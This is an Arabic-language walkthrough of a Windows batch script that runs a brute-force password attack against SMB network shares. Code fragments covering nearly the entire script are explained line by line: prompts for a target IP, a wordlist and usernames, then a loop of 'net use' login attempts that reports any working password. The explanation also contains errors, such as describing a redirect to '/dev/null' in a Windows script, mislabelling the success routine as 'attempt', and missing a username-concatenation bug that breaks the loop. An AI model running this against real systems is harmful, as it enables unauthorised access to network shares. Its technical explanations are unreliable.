## شرح كود  SMB Bruteforce بالتفصيل

هذا الكود عبارة عن برنامج نصي (Batch script) مصمم لتنفيذ هجوم brute force  على نظام SMB (Server Message Block).  يستخدم هذا النوع من الهجمات تجربة مجموعات مختلفة من أسماء المستخدمين وكلمات المرور للوصول إلى موارد الشبكة.  

**الخطوات:**

1. **بدء البرنامج:**
   - `@echo off` :  يقوم بإخفاء أوامر البرنامج النصي أثناء تشغيله. 
   - `title SMB Bruteforce` :  يحدد عنوان البرنامج النصي.
   - `color A` :  يُغير لون الخلفية والنص في واجهة سطر الأوامر.

2. **إدخال البيانات:**
   - `set /p ip="Enter the IP address: "` :  يُطلب من المستخدم إدخال عنوان IP  للخادم الذي سيتم استهدافه.
   - `set /p wordlist="Enter wordlist path: "` :  يُطلب من المستخدم إدخال المسار إلى ملف قوائم كلمات المرور الذي يحتوي على مجموعة كلمات المرور التي سيتم استخدامها في الهجوم.
   - `set /p timelimit="Enter time limit in seconds (0 for unlimited): "` :  يُطلب من المستخدم إدخال مدة زمنية محددة لتنفيذ هجوم brute force (0 = لا توجد مدة زمنية).

3. **تهيئة المتغيرات:**
   - `set /a count= 0` :  يُنشئ متغير يُسمى `count`  ويعطي له القيمة صفر، لعد محاولات الدخول.
   - `set /a starttime=%time:~0,2%%time:~3,2%%time:~6,2%` :  يُنشئ متغير يُسمى `starttime`  ويُخزن الوقت الحالي بدقة ثانية،  ويستخدم `%time:~0,2%`  و `%time:~3,2%`  و `%time:~6,2%`  لاستخراج الساعات والدقائق والثواني من متغير `%time%`.
   - `set /a limittime=%starttime% + %timelimit%` :  يُنشئ متغير يُسمى `limittime`  ويُخزن الوقت المحدد لإنهاء الهجوم، ويتم حسابها بإضافة مدة الزمن المحددة (`timelimit`)  إلى الوقت الحالي (`starttime`).

4. **إدخال أسماء المستخدمين:**
   - `echo.
   echo Enter usernames (one per line, leave blank to finish):` :  يُطلب من المستخدم إدخال أسماء المستخدمين.
   - `set usernames=
   set /p username=` :  يُنشئ متغير يُسمى `usernames`  ويُخزن فيه أسماء المستخدمين.
   - `:get_usernames
   if not "%username%"=="" (` :  يُتحقق من عدم فارغية متغير `username`.
   - `set usernames=%usernames%%username%` :  يُضيف اسم المستخدم المُدخَل إلى متغير `usernames`.
   - `set /p username=` :  يُطلب من المستخدم إدخال اسم مستخدم آخر.
   - `goto get_usernames` :  يعود البرنامج إلى بداية حلقة `get_usernames`  لاستقبال اسم مستخدم آخر حتى يُدخل المستخدم قيمة فارغة.

5. **تنفيذ هجوم brute force:**
   - `for /f "delims= " %%a in ("%usernames%") do (` :  تُنفذ حلقة `for`  للكل اسم مستخدم مُخزّن في متغير `usernames`.
   - `echo.
   echo Bruteforcing username: %%a` :  يعرض اسم المستخدم الحالي الذي يتم استهدافه.
   - `set /a count= 0` :  يعيد تعيين عداد المحاولات (`count`)  إلى صفر لاسم المستخدم الجديد.
   - `for /f %%b in (%wordlist%) do (` :  تُنفذ حلقة `for`  للكل كلمة مرور مُخزّنة في ملف قوائم كلمات المرور.
   - `set pass=%%b` :  يُخزن كلمة المرور الحالية في متغير يُسمى `pass`.
   - `call :attempt %%a %%b` :  يدعو البرنامج إلى عملية `attempt`  للمحاولة باستخدام اسم المستخدم وكلمة المرور الحاليين.
   - `set /a currenttime=%time:~0,2%%time:~3,2%%time:~6,2%` :  يحصل على الوقت الحالي  للتحقق من مدة الزمن المحددة.
   - `if %timelimit% NEQ 0 (
   if %currenttime% GEQ %limittime% (` :  يُتحقق من وجود مدة زمنية محددة (timelimit)  وإذا كانت موجودة، يُتحقق من وصول الوقت الحالي إلى الوقت المحدد لإنهاء الهجوم.
   - `echo Time limit reached. Exiting.` :  يعرض رسالة "المدة الزمنية محددة. إنهاء" .
   - `goto end` :  يذهب البرنامج إلى عملية `end`.
   - `)
   )
   )` :  تُغلق الحلقة  `for`  الداخلية.
   - `)` :  تُغلق الحلقة  `for`  الخارجية.

6. **إتمام هجوم brute force:**
   - `:end
   echo.
   echo Bruteforce completed.` :  يعرض رسالة "إتمام هجوم brute force".
   - `pause` :  يُعلق البرنامج حتى يُضغط المستخدم على مفتاح Enter.
   - `exit` :  ينهي البرنامج.

7. **عملية attempt:**
   - `:success
   echo Password found!:%pass% ` :  يعرض رسالة "كلمة المرور وجدت!"  ويسجل كلمة المرور التي نجحت.
   - `echo.
   echo Connecting to the share...` :  يعرض رسالة "الاتصال بالمشاركة...".
   - `net use \\%ip% /user:%user% %pass% >nul 2>&1` :  يُحاول الاتصال بمشاركة الشبكة باستخدام اسم المستخدم وكلمة المرور التي نجحت، ويتم توجيه الناتج إلى `/dev/null`  لمنع عرض المعلومات.
   - `echo.
   if %errorlevel% EQU 0 (` :  يُتحقق من نجاح الاتصال بالمشاركة (قيمة `errorlevel`  تكون صفرًا إذا نجح الاتصال).
   - `echo Connection successful!` :  يعرض رسالة "الاتصال ناجح!".
   - `pause` :  يُعلق البرنامج حتى يُضغط المستخدم على مفتاح Enter.
   - `) else (` :  يُتحقق من عدم نجاح الاتصال.
   - `echo Connection failed.` :  يعرض رسالة "الاتصال فاشل!".
   - `)
   exit` :  ينهي البرنامج.

8. **عملية attempt:**
   - `:attempt
   set user=%1
   set pass=%2` :  يُحصل على اسم المستخدم وكلمة المرور المُمرّران إلى هذه العملية.
   - `net use \\%ip% /user:%user% %pass% >nul 2>&1` :  يُحاول الاتصال بمشاركة الشبكة باستخدام اسم المستخدم وكلمة المرور المُدخلين، ويتم توجيه الناتج إلى `/dev/null`  لمنع عرض المعلومات.
   - `echo [Attempt %count%]: %pass%` :  يعرض رقم المحاولة الحالي وكلمة المرور المُستخدمة.
   - `set /a count+=1` :  يزيد عداد المحاولات بواحد.
   - `if %errorlevel% EQU 0 goto success` :  يُتحقق من نجاح الاتصال بالمشاركة (قيمة `errorlevel`  تكون صفرًا إذا نجح الاتصال)،  وإذا نجح الاتصال، يذهب البرنامج إلى عملية `success`.

**ملخص:**

يُعد هذا الكود مثالاً على هجوم brute force  على نظام SMB.  يُستخدم هذا الكود لمحاولة الوصول إلى مشاركات الشبكة عن طريق تجربة مجموعة من أسماء المستخدمين وكلمات المرور.  يُنصح بعدم استخدام هذا الكود إلا لأغراض تعليمية أو قانونية،  وإلا فسوف ينتهك سياسة استخدام نظام SMB.


